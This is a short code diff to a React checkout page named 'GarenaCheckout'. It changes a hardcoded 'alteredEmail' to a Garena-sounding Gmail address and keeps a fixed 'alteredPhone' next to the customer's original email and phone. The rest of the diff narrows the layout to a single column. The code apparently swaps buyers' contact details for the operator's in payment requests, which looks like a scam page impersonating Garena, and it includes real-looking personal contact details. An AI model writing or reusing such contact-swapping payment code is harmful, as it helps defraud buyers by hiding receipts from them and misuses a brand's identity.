@@ -264,7 +264,7 @@ export default function GarenaCheckout() {
             txnid,
             originalEmail: form.email.trim(),
             originalPhone: form.phone.trim(),
-            alteredEmail: 'contactkalpnaji@gmail.com',
+            alteredEmail: 'connectwithgarena@gmail.com',
             alteredPhone: '9319969384',
             customerName: form.name.trim(),
             amount: String(pkg),
@@ -631,7 +631,7 @@ export default function GarenaCheckout() {
         boxShadow: '0 1px 3px rgba(0,0,0,0.06)',
       }}>
         <div style={{
-          maxWidth: isDesktop ? 1200 : '100%',
+          maxWidth: 480,
           margin: '0 auto',
           padding: isMobile ? '0 14px' : '0 24px',
           height: isMobile ? 50 : 56,
@@ -713,7 +713,7 @@ export default function GarenaCheckout() {
           display: 'flex', alignItems: 'center',
           padding: isMobile ? '0 14px' : '0 24px',
           gap: isMobile ? 10 : 14,
-          maxWidth: isDesktop ? 1200 : '100%',
+          maxWidth: 480,
           margin: '0 auto',
         }}>
           <img
@@ -783,10 +783,10 @@ export default function GarenaCheckout() {
         boxSizing: 'border-box'
       }}>
         <div style={{
-          display: isDesktop ? 'grid' : 'block',
-          gridTemplateColumns: isDesktop ? '1fr 1fr' : 'none',
-          gap: isDesktop ? 20 : 0,
-          maxWidth: isDesktop ? 1100 : 560,
+          display: 'flex',
+          flexDirection: 'column',
+          gap: 16,
+          maxWidth: 480,
           margin: '0 auto',
         }}>
           
